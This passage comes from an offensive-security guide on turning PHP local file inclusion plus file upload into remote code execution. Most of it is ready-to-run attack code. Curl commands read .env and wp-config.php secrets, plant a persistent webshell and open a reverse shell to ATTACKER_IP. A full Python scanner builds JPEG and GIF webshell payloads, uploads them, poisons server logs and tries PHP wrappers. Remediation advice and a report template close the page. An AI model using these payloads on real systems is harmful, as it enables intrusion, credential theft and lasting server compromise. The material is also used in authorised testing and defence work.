  curl -s "${LFI_SHELL}&cmd=whoami"
  curl -s "${LFI_SHELL}&cmd=uname+-a"
  curl -s "${LFI_SHELL}&cmd=cat+/etc/passwd" | head -5

  # Read application secrets
  curl -s "${LFI_SHELL}" --data-urlencode "cmd=cat /var/www/html/.env"
  curl -s "${LFI_SHELL}" --data-urlencode "cmd=cat /var/www/html/wp-config.php"
  curl -s "${LFI_SHELL}" --data-urlencode "cmd=env | grep -iE 'key|secret|pass|token|database'"

  # Network enumeration
  curl -s "${LFI_SHELL}" --data-urlencode "cmd=ip addr"
  curl -s "${LFI_SHELL}" --data-urlencode "cmd=ss -tlnp"
  curl -s "${LFI_SHELL}" --data-urlencode "cmd=cat /etc/hosts"

  # Write persistent webshell (escape the LFI chain)
  curl -s "${LFI_SHELL}" --data-urlencode "cmd=echo '<?php system(\$_GET[\"cmd\"]); ?>' > /var/www/html/uploads/persistent.php"

  # Verify persistent shell
  sleep 1
  curl -s "${TARGET}/uploads/persistent.php?cmd=id"

  # Reverse shell
  # Listener: nc -lvnp 4444
  curl -s "${LFI_SHELL}" --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Null Byte Truncation (PHP < 5.3.4)"}
  ```bash
  # When the LFI appends .php extension:
  # include($_GET['page'] . '.php');
  # Use null byte to truncate the appended extension

  TARGET="https://target.com"
  LFI_PARAM="page"

  echo "═══ Null Byte LFI + Upload ═══"

  PAYLOADS=(
      "../../../../var/www/html/uploads/avatar.jpg%00"
      "../../../../var/www/html/uploads/avatar.jpg%00.php"
      "../../../../var/www/html/uploads/avatar.jpg%2500"
      "../../../../var/www/html/uploads/avatar.jpg%c0%80"
      "../uploads/avatar.jpg%00"
      "../uploads/avatar.jpg%00.php"
  )

  for payload in "${PAYLOADS[@]}"; do
      RESULT=$(curl -s "${TARGET}/index.php?${LFI_PARAM}=${payload}&cmd=echo+NULL_BYTE_RCE" --max-time 5 2>/dev/null)
      if echo "$RESULT" | grep -q "NULL_BYTE_RCE"; then
          echo "[!!!] Null byte bypass works: ${payload}"
          echo "    URL: ${TARGET}/index.php?${LFI_PARAM}=${payload}&cmd=COMMAND"
          break
      fi
  done
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="PHP Wrapper Chains"}
  ```bash
  # If PHP wrappers are available, use them for more reliable inclusion

  TARGET="https://target.com"
  LFI_PARAM="page"

  echo "═══ PHP Wrapper LFI + Upload ═══"

  # ── zip:// wrapper (upload ZIP containing PHP) ──
  echo "[*] Testing zip:// wrapper"
  # Upload lfi_zip_payload.jpg (which is actually a ZIP)
  curl -s -X POST "${TARGET}/api/upload" \
    -F "file=@lfi_zip_payload.jpg;filename=data.jpg;type=image/jpeg" \
    -H "Cookie: session=TOKEN"

  # Include via zip://
  for dir in uploads files media; do
      RESULT=$(curl -s "${TARGET}/index.php?${LFI_PARAM}=zip://../${dir}/data.jpg%23shell.php&cmd=id" --max-time 5 2>/dev/null)
      if echo "$RESULT" | grep -q "uid="; then
          echo "[!!!] zip:// RCE: zip://../${dir}/data.jpg#shell.php"
          break
      fi
  done

  # ── phar:// wrapper (upload PHAR with JPEG stub) ──
  echo ""
  echo "[*] Testing phar:// wrapper"
  if [ -f "lfi_phar_payload.jpg" ]; then
      curl -s -X POST "${TARGET}/api/upload" \
        -F "file=@lfi_phar_payload.jpg;filename=archive.jpg;type=image/jpeg" \
        -H "Cookie: session=TOKEN"

      for dir in uploads files media; do
          RESULT=$(curl -s "${TARGET}/index.php?${LFI_PARAM}=phar://../${dir}/archive.jpg/shell.php&cmd=id" --max-time 5 2>/dev/null)
          if echo "$RESULT" | grep -q "uid="; then
              echo "[!!!] phar:// RCE: phar://../${dir}/archive.jpg/shell.php"
              break
          fi
      done
  fi

  # ── data:// wrapper (no upload needed!) ──
  echo ""
  echo "[*] Testing data:// wrapper (no upload required)"
  RESULT=$(curl -s "${TARGET}/index.php?${LFI_PARAM}=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8%2b&cmd=id" --max-time 5 2>/dev/null)
  if echo "$RESULT" | grep -q "uid="; then
      echo "[!!!] data:// wrapper RCE — NO UPLOAD NEEDED!"
  fi

  # ── php://input wrapper ──
  echo ""
  echo "[*] Testing php://input wrapper"
  RESULT=$(curl -s "${TARGET}/index.php?${LFI_PARAM}=php://input" \
    -d '<?php system($_GET["cmd"]); ?>' --max-time 5 2>/dev/null)
  if echo "$RESULT" | grep -q "uid="; then
      echo "[!!!] php://input RCE — NO UPLOAD NEEDED!"
  fi

  # ── expect:// wrapper ──
  echo ""
  echo "[*] Testing expect:// wrapper"
  RESULT=$(curl -s "${TARGET}/index.php?${LFI_PARAM}=expect://id" --max-time 5 2>/dev/null)
  if echo "$RESULT" | grep -q "uid="; then
      echo "[!!!] expect:// wrapper RCE — NO UPLOAD NEEDED!"
  fi
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="PHP Filter Chain RCE (No Upload)"}
  ```bash
  # ═══════════════════════════════════════════════
  # php://filter chain — achieve RCE via LFI without ANY upload
  # Uses filter chain to construct PHP code from base64 conversions
  # Reference: https://github.com/synacktiv/php_filter_chain_generator
  # ═══════════════════════════════════════════════

  TARGET="https://target.com"
  LFI_PARAM="page"

  echo "═══ PHP Filter Chain RCE (No Upload Required) ═══"

  # Clone the filter chain generator
  git clone https://github.com/synacktiv/php_filter_chain_generator.git 2>/dev/null
  cd php_filter_chain_generator

  # Generate filter chain for arbitrary PHP code
  python3 php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]); ?>' 2>/dev/null | tail -1 > /tmp/filter_chain.txt

  CHAIN=$(cat /tmp/filter_chain.txt)

  if [ -n "$CHAIN" ]; then
      # The chain is a long php://filter string that generates PHP code
      RESULT=$(curl -s "${TARGET}/index.php?${LFI_PARAM}=${CHAIN}&cmd=id" --max-time 10 2>/dev/null)
      if echo "$RESULT" | grep -q "uid="; then
          echo "[!!!] PHP Filter Chain RCE — NO UPLOAD AT ALL!"
          echo "    This is pure LFI → RCE without any file upload"
      fi
  fi

  cd ..
  rm -f /tmp/filter_chain.txt
  ```
  :::
::

---

## Comprehensive LFI+Upload Scanner

::code-collapse
```python [lfi_upload_scanner.py]
#!/usr/bin/env python3
"""
LFI to RCE via Upload — Comprehensive Scanner
Discovers LFI parameters, uploads payloads, and chains them for RCE
"""
import requests
import struct
import time
import sys
import os
import io
import urllib3
urllib3.disable_warnings()

class LFIUploadScanner:
    LFI_PARAMS = [
        'file', 'page', 'path', 'dir', 'doc', 'template', 'include',
        'inc', 'load', 'read', 'view', 'content', 'module', 'action',
        'layout', 'theme', 'lang', 'locale', 'cat', 'download', 'src',
        'resource', 'location', 'display', 'show', 'pg', 'p', 'f',
        'item', 'section', 'part', 'component', 'tpl', 'skin', 'conf',
    ]

    TRAVERSAL_DEPTHS = range(1, 11)

    SENSITIVE_FILES = [
        'etc/passwd', 'etc/hostname', 'proc/self/environ',
        'proc/version', 'etc/os-release',
    ]

    UPLOAD_DIRS = [
        'uploads', 'files', 'media', 'images', 'content',
        'static', 'assets', 'data', 'tmp', 'public/uploads',
    ]

    LOG_PATHS = [
        'var/log/apache2/access.log', 'var/log/apache2/error.log',
        'var/log/nginx/access.log', 'var/log/nginx/error.log',
        'var/log/httpd/access_log', 'var/log/httpd/error_log',
        'opt/lampp/logs/access_log', 'proc/self/fd/1',
    ]

    SESSION_PATHS = [
        'tmp/sess_{sid}', 'var/lib/php/sessions/sess_{sid}',
        'var/lib/php5/sessions/sess_{sid}',
    ]

    def __init__(self, target, upload_url=None, field="file", cookies=None):
        self.target = target.rstrip('/')
        self.upload_url = upload_url
        self.field = field
        self.session = requests.Session()
        self.session.verify = False
        self.session.timeout = 10
        if cookies:
            self.session.cookies.update(cookies)
        self.lfi_param = None
        self.lfi_depth = None
        self.lfi_url = None
        self.upload_path = None

    def find_lfi(self, page_url=None):
        """Discover LFI parameter and traversal depth"""
        if page_url is None:
            page_url = f"{self.target}/index.php"

        print("[*] Phase 1: LFI Discovery")
        for param in self.LFI_PARAMS:
            for depth in self.TRAVERSAL_DEPTHS:
                traversal = '../' * depth
                for target_file in self.SENSITIVE_FILES[:2]:
                    try:
                        r = self.session.get(page_url,
                            params={param: f'{traversal}{target_file}'}, timeout=5)
                        if 'root:' in r.text or 'Linux' in r.text:
                            self.lfi_param = param
                            self.lfi_depth = depth
                            self.lfi_url = page_url
                            print(f"  [!!!] LFI found: ?{param}={'../' * depth}{target_file}")
                            return True
                    except:
                        pass
        print("  [-] No LFI found with standard parameters")
        return False

    def create_jpeg_payload(self):
        """Create JPEG with PHP in COM segment"""
        from PIL import Image
        shell = b'<?php system($_GET["cmd"]); ?>'

        img = Image.new('RGB', (100, 100), (128, 64, 192))
        buf = io.BytesIO()
        img.save(buf, 'JPEG', quality=90)
        jpeg = buf.getvalue()

        com = b'\xff\xfe' + struct.pack('>H', len(shell) + 2) + shell
        payload = jpeg[:2] + com + jpeg[2:] + b'\n' + shell
        return payload

    def create_gif_payload(self):
        """Create GIF with PHP in comment"""
        shell = b'<?php system($_GET["cmd"]); ?>'
        gif = bytearray(b'GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00')
        gif += b'\x21\xfe' + bytes([len(shell)]) + shell + b'\x00'
        gif += b'\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3b'
        gif += b'\n' + shell
        return bytes(gif)

    def upload_payload(self, content, filename):
        """Upload the payload file"""
        if not self.upload_url:
            return False
        files = {self.field: (filename, content, 'image/jpeg')}
        try:
            r = self.session.post(self.upload_url, files=files, timeout=15)
            return r.status_code in [200, 201]
        except:
            return False

    def try_include(self, file_path, with_cmd=True):
        """Try to include a file via LFI and check for RCE"""
        traversal = '../' * self.lfi_depth
        params = {self.lfi_param: f'{traversal}{file_path}'}
        if with_cmd:
            params['cmd'] = 'echo LFI_RCE_CHAIN_CONFIRMED'

        try:
            r = self.session.get(self.lfi_url, params=params, timeout=5)
            return 'LFI_RCE_CHAIN_CONFIRMED' in r.text
        except:
            return False

    def chain_upload_lfi(self):
        """Upload payload then include it via LFI"""
        print("\n[*] Phase 2: Upload + LFI Chain")

        # Upload JPEG payload
        jpeg_payload = self.create_jpeg_payload()
        filenames = ['avatar.jpg', 'photo.jpg', 'image.jpg', 'upload.jpg']

        for filename in filenames:
            if self.upload_payload(jpeg_payload, filename):
                print(f"  [+] Uploaded: {filename}")

                # Try to include from various paths
                for upload_dir in self.UPLOAD_DIRS:
                    abs_path = f'var/www/html/{upload_dir}/{filename}'
                    if self.try_include(abs_path):
                        self.upload_path = abs_path
                        print(f"  [!!!] LFI+Upload RCE: {abs_path}")
                        return True

                    # Relative path
                    rel_path = f'{upload_dir}/{filename}'
                    params = {self.lfi_param: f'../{rel_path}', 'cmd': 'echo LFI_RCE_CHAIN_CONFIRMED'}
                    try:
                        r = self.session.get(self.lfi_url, params=params, timeout=5)
                        if 'LFI_RCE_CHAIN_CONFIRMED' in r.text:
                            self.upload_path = rel_path
                            print(f"  [!!!] LFI+Upload RCE (relative): ../{rel_path}")
                            return True
                    except:
                        pass

        # Try GIF payload
        gif_payload = self.create_gif_payload()
        if self.upload_payload(gif_payload, 'avatar.gif'):
            print(f"  [+] Uploaded: avatar.gif")
            for upload_dir in self.UPLOAD_DIRS:
                if self.try_include(f'var/www/html/{upload_dir}/avatar.gif'):
                    print(f"  [!!!] LFI+Upload RCE via GIF")
                    return True

        return False

    def try_log_poisoning(self):
        """Try RCE via log file poisoning (no upload needed)"""
        print("\n[*] Phase 3: Log Poisoning (no upload)")

        # Inject PHP into access log
        try:
            self.session.get(self.target, headers={
                'User-Agent': '<?php system($_GET["cmd"]); ?>'
            }, timeout=5)
        except:
            pass

        for log in self.LOG_PATHS:
            if self.try_include(log):
                print(f"  [!!!] Log poisoning RCE: {log}")
                return True

        return False

    def try_wrappers(self):
        """Try PHP wrapper-based RCE (no upload needed)"""
        print("\n[*] Phase 4: PHP Wrappers (no upload)")

        wrappers = {
            'data://': 'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+',
            'expect://': 'expect://id',
            'php://input': 'php://input',
        }

        for name, wrapper in wrappers.items():
            params = {self.lfi_param: wrapper, 'cmd': 'echo WRAPPER_RCE'}
            try:
                if name == 'php://input':
                    r = self.session.post(self.lfi_url, params={self.lfi_param: wrapper},
                        data='<?php system($_GET["cmd"]); ?>', timeout=5)
                else:
                    r = self.session.get(self.lfi_url, params=params, timeout=5)

                if 'WRAPPER_RCE' in r.text or 'uid=' in r.text:
                    print(f"  [!!!] {name} wrapper RCE — NO UPLOAD NEEDED!")
                    return True
            except:
                pass

        return False

    def scan(self, page_url=None):
        """Run complete LFI+Upload scan"""
        print(f"\n{'='*60}")
        print(f" LFI to RCE via Upload Scanner")
        print(f"{'='*60}")
        print(f"[*] Target: {self.target}")
        if self.upload_url:
            print(f"[*] Upload: {self.upload_url}")

        # Phase 1: Find LFI
        if not self.find_lfi(page_url):
            print("\n[-] No LFI vulnerability found")
            return False

        # Phase 2: Upload + LFI chain
        if self.upload_url:
            if self.chain_upload_lfi():
                traversal = '../' * self.lfi_depth
                print(f"\n{'='*60}")
                print(f" [!!!] LFI + Upload = RCE CONFIRMED")
                print(f"{'='*60}")
                print(f" Shell: {self.lfi_url}?{self.lfi_param}={traversal}{self.upload_path}&cmd=COMMAND")
                return True

        # Phase 3: Log poisoning
        if self.try_log_poisoning():
            return True

        # Phase 4: PHP wrappers
        if self.try_wrappers():
            return True

        print("\n[-] Could not achieve RCE through available chains")
        return False


if __name__ == "__main__":
    scanner = LFIUploadScanner(
        target="https://target.com",
        upload_url="https://target.com/api/upload",
        field="file",
        cookies={"session": "AUTH_TOKEN"},
    )
    scanner.scan()
```
::

---

## Method Reference — All LFI+Upload Chains

::collapsible

| # | Method | Upload Required | PHP Version | Description |
| - | ------ | --------------- | ----------- | ----------- |
| 1 | EXIF Comment + LFI | Yes | Any | PHP in EXIF Comment field, include via path traversal |
| 2 | JPEG COM segment + LFI | Yes | Any | PHP in JPEG COM marker, include via LFI |
| 3 | GIF comment + LFI | Yes | Any | PHP in GIF comment extension, include via LFI |
| 4 | PNG tEXt chunk + LFI | Yes | Any | PHP in PNG text metadata, include via LFI |
| 5 | Post-EOF injection + LFI | Yes | Any | PHP appended after image EOF marker |
| 6 | ZIP upload + zip:// wrapper | Yes | 5.x+ | Upload ZIP, include via `zip://uploads/file.jpg#shell.php` |
| 7 | PHAR upload + phar:// wrapper | Yes | 5.3+ | Upload PHAR with JPEG stub, include via `phar://` |
| 8 | Log poisoning (Apache) | No | Any | Inject PHP in User-Agent, include access.log |
| 9 | Log poisoning (Nginx) | No | Any | Same technique, different log paths |
| 10 | Log poisoning (SSH) | No | Any | SSH login with PHP username, include auth.log |
| 11 | Log poisoning (SMTP) | No | Any | Email with PHP headers, include mail.log |
| 12 | /proc/self/environ | No | Any | PHP in User-Agent, include environ file |
| 13 | PHP session injection | Partial | Any | Inject PHP into session data, include session file |
| 14 | data:// wrapper | No | 5.2+ | Direct code execution: `data://text/plain;base64,...` |
| 15 | expect:// wrapper | No | Requires ext | Direct command: `expect://id` |
| 16 | php://input | No | 5.x+ | POST body as included content |
| 17 | php://filter chain | No | 5.x+ | Construct PHP from filter conversions |
| 18 | Temp file race condition | Partial | Any | Race to include PHP temp upload file |
| 19 | ICC profile injection + LFI | Yes | Any | PHP in ICC color profile (survives re-encoding) |
| 20 | XMP metadata + LFI | Yes | Any | PHP in XMP data, include via LFI |

::

---

## Exploitation Chains

::card-group
  :::card
  ---
  icon: i-lucide-link
  title: Image Upload → EXIF PHP → LFI Include → RCE
  ---
  1. Upload valid JPEG with `<?php system($_GET["cmd"]); ?>` in EXIF Comment
  2. File passes all validation (valid JPEG, correct extension, proper MIME)
  3. Trigger LFI: `?page=../../../../uploads/avatar.jpg&cmd=id`
  4. PHP processes the image, finds `<?php` in EXIF, executes it
  5. Full RCE through a valid image file
  :::

  :::card
  ---
  icon: i-lucide-link
  title: ZIP Upload → zip:// Wrapper → RCE
  ---
  1. Create ZIP containing `shell.php` with PHP code
  2. Rename to `.jpg` and upload as image
  3. Trigger LFI: `?page=zip://uploads/file.jpg%23shell.php&cmd=id`
  4. PHP's `zip://` wrapper opens the ZIP and includes `shell.php`
  5. RCE through ZIP wrapper inclusion
  :::

  :::card
  ---
  icon: i-lucide-link
  title: Log Poisoning → LFI Include → RCE (No Upload)
  ---
  1. Send request with PHP in User-Agent header
  2. Apache/Nginx writes the PHP code to access.log
  3. Trigger LFI: `?page=../../../../var/log/apache2/access.log&cmd=id`
  4. PHP includes the log file, finds and executes the injected code
  5. RCE without any file upload
  :::

  :::card
  ---
  icon: i-lucide-link
  title: PHP Filter Chain → RCE (No Upload, No Log)
  ---
  1. No upload, no log access, no writable files needed
  2. Use `php://filter` with chained conversions to construct PHP code
  3. The filter chain generates `<?php system(...); ?>` from iconv conversions
  4. Include the constructed code via LFI
  5. Pure LFI → RCE without any external file
  :::

  :::card
  ---
  icon: i-lucide-link
  title: PHAR Upload → phar:// Wrapper → Deserialization → RCE
  ---
  1. Create PHAR archive with JPEG stub (passes image validation)
  2. PHAR metadata contains serialized PHP object with gadget chain
  3. Upload as `.jpg` image
  4. ANY file operation on `phar://uploads/file.jpg` triggers deserialization
  5. Gadget chain executes → RCE
  :::

  :::card
  ---
  icon: i-lucide-link
  title: Session Injection → LFI Include → RCE
  ---
  1. Submit PHP code in a form field that gets stored in PHP session
  2. Session file created at `/tmp/sess_SESSIONID`
  3. Include session file via LFI: `?page=../../../../tmp/sess_SESSIONID&cmd=id`
  4. PHP processes session file, finds and executes injected code
  5. RCE through session data injection
  :::
::

---

## Reporting & Remediation

### Report Structure

::steps{level="4"}

#### Title
`Remote Code Execution via LFI + File Upload Chain at [Endpoint]`

#### Root Cause
The application has two separate vulnerabilities that chain together for critical impact: (1) a Local File Inclusion vulnerability in the `page` parameter of `index.php`, and (2) a file upload endpoint that stores user-uploaded images without stripping metadata. PHP code embedded in the uploaded image's EXIF metadata executes when the image is included via the LFI vulnerability.

#### Reproduction
```bash
# 1. Create image with PHP in EXIF
exiftool -Comment='<?php system($_GET["cmd"]); ?>' photo.jpg

# 2. Upload image (passes all validation)
curl -X POST "https://target.com/api/upload" \
  -F "file=@photo.jpg;type=image/jpeg" -H "Cookie: session=TOKEN"

# 3. Include via LFI
curl "https://target.com/index.php?page=../../../../var/www/html/uploads/photo.jpg&cmd=id"
# Output: uid=33(www-data)
```

#### Impact
Full Remote Code Execution. An attacker can execute arbitrary OS commands, read sensitive files, access databases, pivot to internal networks, and establish persistent access — all through a valid image upload and a file inclusion vulnerability.

::

### Remediation

::card-group
  :::card
  ---
  icon: i-lucide-shield-check
  title: Fix the LFI
  ---
  Never include files based on user input. Use a whitelist of allowed pages: `$allowed = ['home', 'about', 'contact']; if (in_array($_GET['page'], $allowed)) include($page . '.php');`
  :::

  :::card
  ---
  icon: i-lucide-shield-check
  title: Strip All Metadata
  ---
  Re-encode uploaded images through an image library, stripping ALL metadata (EXIF, IPTC, XMP, ICC, comments). Save a clean copy with only pixel data.
  :::

  :::card
  ---
  icon: i-lucide-shield-check
  title: Store Outside Web Root
  ---
  Save uploads in a non-web-accessible directory. Serve through a proxy script. This prevents both direct access and LFI inclusion.
  :::

  :::card
  ---
  icon: i-lucide-shield-check
  title: Disable PHP Wrappers
  ---
  Set `allow_url_include = Off` and `allow_url_fopen = Off` in `php.ini`. This prevents `data://`, `expect://`, `php://input`, and `phar://` wrapper exploitation.
  :::

  :::card
  ---
  icon: i-lucide-shield-check
  title: Validate Canonical Path
  ---
  Use `realpath()` on any included file path and verify it starts with the expected directory. Reject any path containing `..` or that resolves outside the allowed directory.
  :::

  :::card
  ---
  icon: i-lucide-shield-check
  title: open_basedir Restriction
  ---
  Set `open_basedir` in `php.ini` to restrict PHP file access to the application directory only. This prevents inclusion of files from `/tmp`, `/var/log`, or upload directories.
  :::
::

---

## References & Resources

::card-group
  :::card
  ---
  icon: i-lucide-external-link
  title: HackTricks — File Inclusion
  to: https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/
  target: _blank
  ---
  Comprehensive LFI/RFI guide covering all wrappers, log poisoning, filter chains, and upload chaining techniques.
  :::

  :::card
  ---
  icon: i-lucide-external-link
  title: PayloadsAllTheThings — File Inclusion
  to: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion
  target: _blank
  ---
  Extensive payload repository for LFI exploitation including wrapper payloads, log paths, and session injection techniques.
  :::

  :::card
  ---
  icon: i-lucide-external-link
  title: PHP Filter Chain Generator
  to: https://github.com/synacktiv/php_filter_chain_generator
  target: _blank
  ---
  Synacktiv's tool for generating `php://filter` chains that achieve RCE through LFI without any file upload or write primitive.
  :::

  :::card
  ---
  icon: i-lucide-external-link
  title: OWASP — Path Traversal
  to: https://owasp.org/www-community/attacks/Path_Traversal
  target: _blank
  ---
  OWASP reference for path traversal attacks covering encoding bypasses, canonicalization issues, and prevention techniques.
  :::

  :::card
  ---
  icon: i-lucide-external-link
  title: PortSwigger — File Path Traversal Labs
  to: https://portswigger.net/web-security/file-path-traversal
  target: _blank
  ---
  Interactive labs for practicing LFI and path traversal attacks with step-by-step solutions.
  :::

  :::card
  ---
  icon: i-lucide-external-link
  title: HackerOne — LFI Disclosed Reports
  to: https://hackerone.com/hacktivity?querystring=local%20file%20inclusion
  target: _blank
  ---
  Real-world disclosed bug bounty reports demonstrating LFI to RCE chains on production applications.
  :::

  :::card
  ---
  icon: i-lucide-external-link
  title: CWE-98 — PHP File Inclusion
  to: https://cwe.mitre.org/data/definitions/98.html
  target: _blank
  ---
  MITRE CWE entry specifically covering PHP file inclusion vulnerabilities and their remediation.
  :::

  :::card
  ---
  icon: i-lucide-external-link
  title: Wfuzz — LFI Wordlists
  to: https://github.com/xmendez/wfuzz/tree/master/wordlist/Injections
  target: _blank
  ---
  Fuzzing wordlists for LFI parameter discovery, traversal payloads, and log file paths across different operating systems.
  :::

  :::card
  ---
  icon: i-lucide-external-link
  title: LFI Suite — Automated Scanner
  to: https://github.com/D35m0nd142/LFISuite
  target: _blank
  ---
  Automated LFI scanner and exploiter supporting log poisoning, filter chains, and various wrapper-based exploitation techniques.
  :::

  :::card
  ---
  icon: i-lucide-external-link
  title: P0wny Shell — Minimal PHP Webshell
  to: https://github.com/flozz/p0wny-shell
  target: _blank
  ---
  Lightweight PHP webshell ideal for embedding in uploaded images — small footprint, single-file, interactive terminal interface.
  :::
::